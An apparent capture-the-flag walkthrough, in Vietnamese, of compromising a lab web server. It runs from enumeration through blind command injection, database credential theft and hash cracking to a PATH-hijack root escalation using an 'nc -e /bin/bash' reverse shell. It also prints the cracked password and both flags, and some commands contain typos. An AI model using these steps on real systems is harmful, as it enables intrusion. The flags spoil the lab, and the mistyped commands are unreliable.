########################### ENUMURATE ###########################

sai nmap de scan port nao dang mo tren server 

nmap -T4 -sC -sV -Pn 10.10.11.104 -oN nmap.txt

2 port dang mo la 22 (ssh) va 80(http) webserver dang su dung la apache

sai gobuter de brute thu muc 


gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x "php"


/index.php            (Status: 302) [Size: 2801] [--> login.php]
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/login.php            (Status: 200) [Size: 2224]                
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2968] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
Progress: 2168 / 415288 (0.52%)                                              
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]              

#####################################################################


############################# EXPLOIT ###############################

su dung curl de tao acc 

curl -XPOST http://10.10.11.104/ -d "username=d47&password=d47&confirm=d47"

login vao

co file backup.zip => download => doc source => file logs.php co loi

blind command injection 

tao mot reverse shell 

nhung ko co quyen de doc file user.txt, nen can phai dang nhap vao voi quyen m4lwhere 

cho file config.php => co chua username vs password => connect vao mysql 

mysql -u root -p (password trong file config)

tim duoc password cua m4lwhere o trong database 

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.

crack password cua m4lwhere sai hashcat
hashcat -m 500 -a 0 -o cracked.txt hash /usr/share/wordlists/rockyou.txt
-m: loai hash dung de crack
-a : loai attack 0, co nghia la su dung dictionary attack
-o: output cua password da duoc crack



password: ilovecody112235!

nmap ban dau ta biet duoc la co 2 port dang mo la ssh, http , lay username, password login vao

user.txt => dc1e07036f5db6e73dcca8b99e820885

su dung path injection de leo quyen thanh root

ta thay trong file script no dang su dung lenh la gzip, date => co the chon 1 trong 2 de leo quyen root 

ta su dung date de tao reverse shell de chiem quyen root

b1: cd /tmp => echo "nc -e /bin/bash if port" > date
b2: cap quyen thuc thi cho file: chmod +x date
b3: dua path cua file date vao $PATH : export PATH:/tmp:$PATH
b4: sudo file_script => chiem duoc quyen root 


root.txt => e85ef00100f1c552535b5123979535bb

#####################################################################